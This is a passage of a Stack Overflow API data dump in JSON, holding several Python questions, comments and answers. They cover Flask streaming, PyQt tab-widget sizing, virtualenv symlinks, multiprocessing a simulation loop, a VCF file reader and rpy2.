"https://stackoverflow.com/users/1641381/kevinsa5"}, "edited": false, "score": 2, "creation_date": 1571866035, "post_id": 58531069, "comment_id": 103386198, "body": "I don&#39;t know enough for a full answer, but websockets are one way to achieve such a streaming response.  An alternative would be to set up a polling scheme where the front end periodically asks if there is an updated result.  This would likely require multithreading or similar on the server side."}, {"owner": {"reputation": 56804, "user_id": 7326738, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/VgOrW.jpg?s=128&g=1", "display_name": "Ajax1234", "link": "https://stackoverflow.com/users/7326738/ajax1234"}, "reply_to_user": {"reputation": 2841, "user_id": 1641381, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/crUHq.jpg?s=128&g=1", "display_name": "kevinsa5", "link": "https://stackoverflow.com/users/1641381/kevinsa5"}, "edited": false, "score": 0, "creation_date": 1571867925, "post_id": 58531069, "comment_id": 103386781, "body": "As @kevinsa5 mentioned, a websocket implementation using something like socket.io or <a href=\"https://pusher.com\" rel=\"nofollow noreferrer\">pusher</a> is perhaps your best approach."}, {"owner": {"reputation": 14624, "user_id": 5588279, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/31a5c0b08beca9ebc2c1d5e60ba691d7?s=128&d=identicon&r=PG&f=1", "display_name": "Sraw", "link": "https://stackoverflow.com/users/5588279/sraw"}, "edited": false, "score": 0, "creation_date": 1571867960, "post_id": 58531069, "comment_id": 103386795, "body": "<a href=\"https://flask.palletsprojects.com/en/1.1.x/patterns/streaming/\" rel=\"nofollow noreferrer\">flask.palletsprojects.com/en/1.1.x/patterns/streaming</a> Flask does allow you to stream. But it will still be a block action. For what you want, you may need WebSockets."}], "owner": {"reputation": 3072, "user_id": 6611672, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/fa3f99cc3070ae57d877e08f9564ed22?s=128&d=identicon&r=PG&f=1", "display_name": "Johnny Metz", "link": "https://stackoverflow.com/users/6611672/johnny-metz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 209, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1571865237, "creation_date": 1571865237, "question_id": 58531069, "link": "https://stackoverflow.com/questions/58531069/flask-return-multiple-responses-incrementally-from-single-request", "title": "Flask: return multiple responses incrementally from single request", "body": "<p>I have a flask server that does some very complex calculations, which can take up to 30 minutes to complete. I've written my code to yield the best possible result throughout the process. For example, my code may yield a top result at 5 min then an even better result at 20 min and then end the process at 30 min. Another example is it may return a result at 3 min and stop at 10 min.</p>\n\n<p>I want to send these top results to a fronted visualization chart. Is there anyway to continuously stream data through a Flask API whenever I want to? Instead of the traditional single request, single response method.</p>\n\n<p>I'd image the Flask route may look something like this:</p>\n\n<pre><code>@app.route(\"/stream\", methods=[\"POST\"])\ndef stream():\n    curr_result = 0\n    max_result = 0\n    while True:\n        curr_result = run_calculations(curr_result)\n        if not curr_result:\n            break\n        if curr_result &gt; max_result:\n            max_result = curr_result\n            yield max_result\n</code></pre>\n"}, {"tags": ["python", "pyqt", "qtabwidget"], "comments": [{"owner": {"reputation": 25800, "user_id": 11162165, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5kgh.png?s=128&g=1", "display_name": "nathancy", "link": "https://stackoverflow.com/users/11162165/nathancy"}, "edited": false, "score": 2, "creation_date": 1571865371, "post_id": 58531066, "comment_id": 103385986, "body": "Please provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimum reproducible example</a>. We can&#39;t determine where the error is occurring without seeing your code"}, {"owner": {"reputation": 1, "user_id": 12151123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de03e60ca00f32f7a80a0ad2c8e85ca3?s=128&d=identicon&r=PG&f=1", "display_name": "alex96", "link": "https://stackoverflow.com/users/12151123/alex96"}, "reply_to_user": {"reputation": 25800, "user_id": 11162165, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t5kgh.png?s=128&g=1", "display_name": "nathancy", "link": "https://stackoverflow.com/users/11162165/nathancy"}, "edited": false, "score": 0, "creation_date": 1571868082, "post_id": 58531066, "comment_id": 103386834, "body": "Hi, I have added an exemple"}, {"owner": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571869702, "post_id": 58531066, "comment_id": 103387249, "body": "Publish the <code>tabwidget.py</code> module."}, {"owner": {"reputation": 1, "user_id": 12151123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de03e60ca00f32f7a80a0ad2c8e85ca3?s=128&d=identicon&r=PG&f=1", "display_name": "alex96", "link": "https://stackoverflow.com/users/12151123/alex96"}, "reply_to_user": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571873300, "post_id": 58531066, "comment_id": 103388017, "body": "Ok, I&#39;ve add it @S.Nick"}, {"owner": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571873568, "post_id": 58531066, "comment_id": 103388072, "body": "Please post the image that you get after running the example that you published. I get a completely different look."}, {"owner": {"reputation": 1, "user_id": 12151123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de03e60ca00f32f7a80a0ad2c8e85ca3?s=128&d=identicon&r=PG&f=1", "display_name": "alex96", "link": "https://stackoverflow.com/users/12151123/alex96"}, "reply_to_user": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571874612, "post_id": 58531066, "comment_id": 103388258, "body": "@S.Nick please find the image of the exemple <a href=\"https://drive.google.com/file/d/1Zl_MM2USOP8Jek0W4MPQjyEH28XCJtbp/view?usp=sharing\" rel=\"nofollow noreferrer\">here</a>"}, {"owner": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571875532, "post_id": 58531066, "comment_id": 103388418, "body": "strange, but it displays correctly on my computer"}, {"owner": {"reputation": 1, "user_id": 12151123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de03e60ca00f32f7a80a0ad2c8e85ca3?s=128&d=identicon&r=PG&f=1", "display_name": "alex96", "link": "https://stackoverflow.com/users/12151123/alex96"}, "reply_to_user": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571875873, "post_id": 58531066, "comment_id": 103388468, "body": "@S.Nick your are on linux I suppose ?"}, {"owner": {"reputation": 10411, "user_id": 7767694, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DoPOp.png?s=128&g=1", "display_name": "S. Nick", "link": "https://stackoverflow.com/users/7767694/s-nick"}, "edited": false, "score": 0, "creation_date": 1571876007, "post_id": 58531066, "comment_id": 103388494, "body": "No, I have Windows"}, {"owner": {"reputation": 97291, "user_id": 984421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l9J30.png?s=128&g=1", "display_name": "ekhumoro", "link": "https://stackoverflow.com/users/984421/ekhumoro"}, "edited": false, "score": 0, "creation_date": 1571924592, "post_id": 58531066, "comment_id": 103406939, "body": "<a href=\"https://doc.qt.io/qt-5/qt.html#TextFlag-enum\" rel=\"nofollow noreferrer\"><code>Qt.TextDontClip</code></a>: &quot;If it&#39;s impossible to stay within the given bounds, it prints outside.&quot;."}, {"owner": {"reputation": 1, "user_id": 12151123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de03e60ca00f32f7a80a0ad2c8e85ca3?s=128&d=identicon&r=PG&f=1", "display_name": "alex96", "link": "https://stackoverflow.com/users/12151123/alex96"}, "edited": false, "score": 0, "creation_date": 1571941218, "post_id": 58531066, "comment_id": 103415113, "body": "I think it might be because of the retina screen"}], "owner": {"reputation": 1, "user_id": 12151123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/de03e60ca00f32f7a80a0ad2c8e85ca3?s=128&d=identicon&r=PG&f=1", "display_name": "alex96", "link": "https://stackoverflow.com/users/12151123/alex96"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1571870360, "creation_date": 1571865197, "last_edit_date": 1571870360, "question_id": 58531066, "link": "https://stackoverflow.com/questions/58531066/how-to-resize-horizontal-qtabwidget", "title": "How to resize horizontal qtabwidget", "body": "<p>I'm following the instruction of this <a href=\"https://stackoverflow.com/questions/46607298/pyqt-qtabwidget-horizontal-tab-and-horizontal-text-in-qtdesigner\">post</a> but I have a problem with the size of the tabwidgets. I would like to adjust it to the size of the text.</p>\n\n<p><a href=\"https://i.stack.imgur.com/iJeX6.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/iJeX6.png\" alt=\"enter image description here\"></a></p>\n\n<p>I have add an exemple of code where the size of the tab doesn't match with the size of the labels :</p>\n\n<pre><code>from PyQt5 import QtCore, QtGui, QtWidgets\n\nclass Ui_MainWindow(object):\n    def setupUi(self, MainWindow):\n        MainWindow.setObjectName(\"MainWindow\")\n        MainWindow.resize(800, 600)\n        self.centralwidget = QtWidgets.QWidget(MainWindow)\n        self.centralwidget.setObjectName(\"centralwidget\")\n        self.tabWidget = TabWidget(self.centralwidget)\n        self.tabWidget.setGeometry(QtCore.QRect(60, 30, 581, 481))\n        self.tabWidget.setTabPosition(QtWidgets.QTabWidget.West)\n        self.tabWidget.setObjectName(\"tabWidget\")\n        self.tab = QtWidgets.QWidget()\n        self.tab.setObjectName(\"tab\")\n        self.tabWidget.addTab(self.tab, \"\")\n        self.tab_2 = QtWidgets.QWidget()\n        self.tab_2.setObjectName(\"tab_2\")\n        self.tabWidget.addTab(self.tab_2, \"\")\n        MainWindow.setCentralWidget(self.centralwidget)\n        self.menubar = QtWidgets.QMenuBar(MainWindow)\n        self.menubar.setGeometry(QtCore.QRect(0, 0, 800, 22))\n        self.menubar.setObjectName(\"menubar\")\n        MainWindow.setMenuBar(self.menubar)\n        self.statusbar = QtWidgets.QStatusBar(MainWindow)\n        self.statusbar.setObjectName(\"statusbar\")\n        MainWindow.setStatusBar(self.statusbar)\n\n        self.retranslateUi(MainWindow)\n        self.tabWidget.setCurrentIndex(1)\n        QtCore.QMetaObject.connectSlotsByName(MainWindow)\n\n    def retranslateUi(self, MainWindow):\n        _translate = QtCore.QCoreApplication.translate\n        MainWindow.setWindowTitle(_translate(\"MainWindow\", \"MainWindow\"))\n        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate(\"MainWindow\", \"Case 1\"))\n        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate(\"MainWindow\", \"Case 2\"))\n\nfrom tabwidget import TabWidget\n\nif __name__ == \"__main__\":\n    import sys\n    app = QtWidgets.QApplication(sys.argv)\n    MainWindow = QtWidgets.QMainWindow()\n    ui = Ui_MainWindow()\n    ui.setupUi(MainWindow)\n    MainWindow.show()\n    sys.exit(app.exec_())\n</code></pre>\n\n<p>And here is the tabwidget.py which is provided in this <a href=\"https://stackoverflow.com/questions/46607298/pyqt-qtabwidget-horizontal-tab-and-horizontal-text-in-qtdesigner\">post</a></p>\n\n<pre><code>from PyQt5 import QtGui, QtWidgets, QtCore\n\nclass HorizontalTabBar(QtWidgets.QTabBar):\n    def paintEvent(self, event):\n        painter = QtWidgets.QStylePainter(self)\n        option = QtWidgets.QStyleOptionTab()\n        for index in range(self.count()):\n            self.initStyleOption(option, index)\n            painter.drawControl(QtWidgets.QStyle.CE_TabBarTabShape, option)\n            painter.drawText(self.tabRect(index),\n                             QtCore.Qt.AlignCenter | QtCore.Qt.TextDontClip,\n                             self.tabText(index))\n\n    def tabSizeHint(self, index):\n        size = QtWidgets.QTabBar.tabSizeHint(self, index)\n        if size.width() &lt; size.height():\n            size.transpose()\n        return size\n\nclass TabWidget(QtWidgets.QTabWidget):\n    def __init__(self, parent=None):\n        QtWidgets.QTabWidget.__init__(self, parent)\n        self.setTabBar(HorizontalTabBar())\n</code></pre>\n"}, {"tags": ["python", "linux", "ubuntu", "virtualenv"], "comments": [{"owner": {"reputation": 4108, "user_id": 977593, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/afRtt.jpg?s=128&g=1", "display_name": "slackmart", "link": "https://stackoverflow.com/users/977593/slackmart"}, "edited": false, "score": 1, "creation_date": 1571865347, "post_id": 58531063, "comment_id": 103385976, "body": "Look carefully, those are symlinks.. try <code>ls -l trydjango&#47;bin</code>"}, {"owner": {"reputation": 1, "user_id": 12265452, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-9mx1o9gKqYo/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdSO-UJ4k3ltmtBwMvx8XBeufztiQ/photo.jpg?sz=128", "display_name": "Oren Ben-Meir", "link": "https://stackoverflow.com/users/12265452/oren-ben-meir"}, "reply_to_user": {"reputation": 4108, "user_id": 977593, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/afRtt.jpg?s=128&g=1", "display_name": "slackmart", "link": "https://stackoverflow.com/users/977593/slackmart"}, "edited": false, "score": 0, "creation_date": 1571865790, "post_id": 58531063, "comment_id": 103386124, "body": "Thank you, I uninstalled virtualenv with pip and pip3 because I used both pip and pip3 for it. So I only installed it with pip3."}], "answers": [{"comments": [{"owner": {"reputation": 4108, "user_id": 977593, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/afRtt.jpg?s=128&g=1", "display_name": "slackmart", "link": "https://stackoverflow.com/users/977593/slackmart"}, "edited": false, "score": 0, "creation_date": 1571866782, "post_id": 58531153, "comment_id": 103386427, "body": "There&#39;s no need to install virtualenv in python3. It already has a built-in module for that matter. Try <code>python3 -m venv myvenv-name</code>"}], "tags": [], "owner": {"reputation": 1, "user_id": 12265452, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-9mx1o9gKqYo/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdSO-UJ4k3ltmtBwMvx8XBeufztiQ/photo.jpg?sz=128", "display_name": "Oren Ben-Meir", "link": "https://stackoverflow.com/users/12265452/oren-ben-meir"}, "is_accepted": false, "score": 0, "last_activity_date": 1571865688, "creation_date": 1571865688, "answer_id": 58531153, "question_id": 58531063, "link": "https://stackoverflow.com/questions/58531063/i-cant-create-a-virtual-environment-set-only-to-python3-in-ubuntu/58531153#58531153", "title": "I can&#39;t create a virtual environment set only to python3 in ubuntu", "body": "<p>I figured out the problem, I used both \npip install virtualenv and pip3 install virtualenv. I uninstalled both and only used pip3 install virtualenv. So now it only uses python3.</p>\n"}, {"tags": [], "owner": {"reputation": 5, "user_id": 2499827, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/15c2771d75d3144c2223d1f0dbb70aca?s=128&d=identicon&r=PG", "display_name": "dbradley771", "link": "https://stackoverflow.com/users/2499827/dbradley771"}, "is_accepted": false, "score": 0, "last_activity_date": 1571866041, "creation_date": 1571866041, "answer_id": 58531214, "question_id": 58531063, "link": "https://stackoverflow.com/questions/58531063/i-cant-create-a-virtual-environment-set-only-to-python3-in-ubuntu/58531214#58531214", "title": "I can&#39;t create a virtual environment set only to python3 in ubuntu", "body": "<p>In the bin folder, both <code>python</code> and <code>python3</code> are just symbolic links to <code>python3.6</code>. This is for convenience so you don't have to always type <code>python3.6</code>.</p>\n\n<p>You can test this by using <code>python --version</code> to see what version actually runs.</p>\n"}], "owner": {"reputation": 1, "user_id": 12265452, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-9mx1o9gKqYo/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdSO-UJ4k3ltmtBwMvx8XBeufztiQ/photo.jpg?sz=128", "display_name": "Oren Ben-Meir", "link": "https://stackoverflow.com/users/12265452/oren-ben-meir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 91, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1571866041, "creation_date": 1571865180, "question_id": 58531063, "link": "https://stackoverflow.com/questions/58531063/i-cant-create-a-virtual-environment-set-only-to-python3-in-ubuntu", "title": "I can&#39;t create a virtual environment set only to python3 in ubuntu", "body": "<p>When I want to create a virtual environment with python3 (well python3.6 to be more precise) it keeps installing both python version even when I explicitly stated for it not to.</p>\n\n<p>I used the command: </p>\n\n<pre><code>virtualenv -p /usr/bin/python3.6 trydjango/\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Running virtualenv with interpreter /usr/bin/python3.6\nAlready using interpreter /usr/bin/python3.6\nUsing base prefix '/usr'\nNew python executable in /home/oren/Dev/Python- \nDev/trydjango/bin/python3.6\nAlso creating executable in /home/oren/Dev/Python- \nDev/trydjango/bin/python\nInstalling setuptools, pip, wheel...\ndone.\n</code></pre>\n\n<p>When I look at the bin directory, I expected only python3.6 installed but this is the output:</p>\n\n<pre><code>activate       activate.ps1      easy_install      pip3    python3        \nwheel\nactivate.csh   activate_this.py  easy_install-3.6  pip3.6  python3.6\nactivate.fish  activate.xsh      pip               python  python-config\n</code></pre>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 2, "creation_date": 1571865238, "post_id": 58531052, "comment_id": 103385942, "body": "You should learn about threading or multi-processing, but that&#39;s a subject for a whole tutorial and can&#39;t be fit for an answer here"}, {"owner": {"reputation": 15, "user_id": 10502496, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-aViAkVJ-t6Y/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DU-k1CYWdHgQl8ivf1iTM5M5cXZEA/mo/photo.jpg?sz=128", "display_name": "aShamed", "link": "https://stackoverflow.com/users/10502496/ashamed"}, "reply_to_user": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571865354, "post_id": 58531052, "comment_id": 103385978, "body": "Hmm okay i&#39;ll have a look around. Thank you for the suggestion"}, {"owner": {"reputation": 473, "user_id": 1422254, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/7c04fad89aa5234d435422e323af82d5?s=128&d=identicon&r=PG", "display_name": "Kevin Eaverquepedo", "link": "https://stackoverflow.com/users/1422254/kevin-eaverquepedo"}, "edited": false, "score": 0, "creation_date": 1571869570, "post_id": 58531052, "comment_id": 103387215, "body": "If you are new at multiprocessing/multithreading, you might want to look at <a href=\"https://github.com/ray-project/ray\" rel=\"nofollow noreferrer\">github.com/ray-project/ray</a>"}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 10502496, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-aViAkVJ-t6Y/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DU-k1CYWdHgQl8ivf1iTM5M5cXZEA/mo/photo.jpg?sz=128", "display_name": "aShamed", "link": "https://stackoverflow.com/users/10502496/ashamed"}, "edited": false, "score": 0, "creation_date": 1572019934, "post_id": 58531780, "comment_id": 103443156, "body": "Thank you, this is really helpful to learn. Is there any reason when i put a print in the function sometimes in the output it prints out the ticks on the same line with a blank space after it? Or is this maybe just because of the IDE im using (pycharm)  Example: <code>181  2 1019 3 20</code>"}], "tags": [], "owner": {"reputation": 11, "user_id": 3359079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/081e4a8c33ea448a325dee6ea4336670?s=128&d=identicon&r=PG&f=1", "display_name": "user3359079", "link": "https://stackoverflow.com/users/3359079/user3359079"}, "is_accepted": false, "score": 0, "last_activity_date": 1571870459, "last_edit_date": 1571870459, "creation_date": 1571869936, "answer_id": 58531780, "question_id": 58531052, "link": "https://stackoverflow.com/questions/58531052/is-there-a-way-to-run-a-while-x-amount-of-times-at-the-same-time/58531780#58531780", "title": "Is there a way to run a while x amount of times at the same time", "body": "<p>You can use multiprocessing to run the function simultaneously n amount of times.</p>\n\n<p>Here is an example where it runs your function n times on 4 cores, and prints the average amount of 'ticks' required to deplete the health to 0.</p>\n\n<pre><code>from multiprocessing import Pool\nimport random\n\ndef depleteHp(input):\n    hp = 99\n    ticks = 0\n    while hp &gt; 0:\n        ticks += 1\n        hp -=  random.randint(0,10)\n    return ticks\n\nif __name__ == '__main__':\n    pool = Pool(processes=4)\n    n = 1000\n    inputs = range(n)\n    # calc depleteHp output using 4 processes\n    out_list = pool.map(depleteHp, inputs)\n    # average  \n    print (sum(out_list) / float(n))\n</code></pre>\n\n<p>pool.map(function, list_of_inputs) 'maps' the function over n processors feeding the next item of the 'list_of_inputs' each time. As such in this case it feeds the numbers 0 to 1000 to the depleteHp function. </p>\n\n<p>out_list then stores a list of the returned value each time.</p>\n"}], "owner": {"reputation": 15, "user_id": 10502496, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-aViAkVJ-t6Y/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DU-k1CYWdHgQl8ivf1iTM5M5cXZEA/mo/photo.jpg?sz=128", "display_name": "aShamed", "link": "https://stackoverflow.com/users/10502496/ashamed"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571870459, "creation_date": 1571865138, "question_id": 58531052, "link": "https://stackoverflow.com/questions/58531052/is-there-a-way-to-run-a-while-x-amount-of-times-at-the-same-time", "title": "Is there a way to run a while x amount of times at the same time", "body": "<p>I have a while loop where something has 99 hp, i want it to randomly \"hit\" it till its 0, now i want to do this lets say a million times to check on differences. Is there a way to do multiple of these \"simulations\" at the same time? Kind of like how in machine learning a teacher teaches multiple students at the same time.</p>\n\n<p>Right now i just add a for statement so i iterate this while loop a million times. But this can take a while.</p>\n\n<p>For example:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import random\n\nhp = 99\nfor n in range(1000000):\n    while hp &gt; 0:\n        hp -=  random.randint(0,10)\n</code></pre>\n\n<p>I'd like it to have to iterate that while loop alot less times or just once if possible unless for some reason this actually takes longer than the above code?</p>\n\n<p>Thank you in advance.</p>\n"}, {"tags": ["python", "list", "function", "vcf-variant-call-format"], "comments": [{"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 1, "creation_date": 1571865378, "post_id": 58531047, "comment_id": 103385990, "body": "Your function doesn&#39;t return anything, so what is supposed to be in <code>lines</code>?"}, {"owner": {"reputation": 171, "user_id": 12055478, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0dd24b2ffca8e1d4f34addb244c84bb3?s=128&d=identicon&r=PG&f=1", "display_name": "wilberox", "link": "https://stackoverflow.com/users/12055478/wilberox"}, "reply_to_user": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571865641, "post_id": 58531047, "comment_id": 103386077, "body": "@OferSadan apologies, it is now irrelevant as I have understood my issue anyway."}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1571865677, "post_id": 58531047, "comment_id": 103386090, "body": "You need to clear out the contents of the <code>lines</code> list your function is using either before calling it, with <code>lines = []</code> or at the beginning of the function with a <code>lines[:] = []</code> statement."}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571866029, "post_id": 58531047, "comment_id": 103386196, "body": "Wouldn&#39;t you prefer to use a dedicated VCF library like e.g. <a href=\"https://pypi.org/project/PyVCF/\" rel=\"nofollow noreferrer\"><code>PyVCF</code></a> ?"}], "answers": [{"tags": [], "owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "is_accepted": true, "score": 1, "last_activity_date": 1571865670, "creation_date": 1571865670, "answer_id": 58531149, "question_id": 58531047, "link": "https://stackoverflow.com/questions/58531047/all-outputs-from-function-are-the-same/58531149#58531149", "title": "All outputs from function are the same", "body": "<p>Possibly, you want to add:</p>\n\n<pre><code>lines = []\n</code></pre>\n\n<p>inside your function at the beginning and:</p>\n\n<pre><code>return lines\n</code></pre>\n\n<p>at the end of your function, and call it like e.g.:</p>\n\n<pre><code>VCF = open(\"frogs.txt\", 'r')\nfrogs = readVCF(VCF)\nVCF.close()\n</code></pre>\n\n<p>or alternatively (probably better):</p>\n\n<pre><code>with open(\"frogs.txt\", 'r') as VCF:\n    frogs = readVCF(VCF)\n</code></pre>\n"}], "owner": {"reputation": 171, "user_id": 12055478, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0dd24b2ffca8e1d4f34addb244c84bb3?s=128&d=identicon&r=PG&f=1", "display_name": "wilberox", "link": "https://stackoverflow.com/users/12055478/wilberox"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 26, "favorite_count": 0, "accepted_answer_id": 58531149, "answer_count": 1, "score": 0, "last_activity_date": 1609647176, "creation_date": 1571865095, "last_edit_date": 1609647176, "question_id": 58531047, "link": "https://stackoverflow.com/questions/58531047/all-outputs-from-function-are-the-same", "title": "All outputs from function are the same", "body": "<p>I have a function to read VCF files </p>\n\n<pre><code>def readVCF(VCF):\n    VCF = VCF.readlines()\n    header = [] \n    data = []\n    for line in VCF:\n        if line.startswith('#'):\n            header.append(line) \n        else:\n            data.append(line)\n    VCF_contents =[]  \n    for line in data:\n        VCF_contents.extend(line.strip().split('\\t'))\n    for i in range(0, len(VCF_contents), 10): \n        lines.append(VCF_contents[i : i+10]) \n</code></pre>\n\n<p>The function works as I want it to, but problems start when I use it more than once.</p>\n\n<p>I want to use this function multiple times, on different files, and the use the outputs from all these different files simultaneously. I have been using the function like this:</p>\n\n<pre><code>VCF = open(\"frogs.txt\", 'r')\nlines = []\nreadVCF(VCF)\nfrogs = lines\nVCF.close\n\nVCF = open(\"rabbits.txt.\", 'r')\nreadVCF(VCF)\nrabbits = lines\nVCF.close\n\nVCF = open(\"lizards.txt\", 'r')\nreadVCF(VCF)\nlizards = lines\nVCF.close\n</code></pre>\n\n<p>The problem is that, all my outputs are the same, and all have the output that comes from <code>frogs.txt</code>, the first file I used the function for. How can reuse this function without getting the same values?</p>\n"}, {"tags": ["python", "r", "rpy2"], "answers": [{"tags": [], "owner": {"reputation": 10688, "user_id": 294017, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/8e5422a173711c086b685140dbc498fe?s=128&d=identicon&r=PG", "display_name": "lgautier", "link": "https://stackoverflow.com/users/294017/lgautier"}, "is_accepted": false, "score": 0, "last_activity_date": 1571867219, "creation_date": 1571867219, "answer_id": 58531402, "question_id": 58530982, "link": "https://stackoverflow.com/questions/58530982/rpy2-handling-nested-data-tables-from-r/58531402#58531402", "title": "rpy2: handling nested data.tables from R", "body": "<p>Would documentation for the current rpy2 release answer this ?\n<a href=\"https://rpy2.github.io/doc/v3.2.x/html/pandas.html\" rel=\"nofollow noreferrer\">https://rpy2.github.io/doc/v3.2.x/html/pandas.html</a></p>\n"}], "owner": {"reputation": 721, "user_id": 6075349, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/27d97643ffe05247df76cb8b492f6728?s=128&d=identicon&r=PG&f=1", 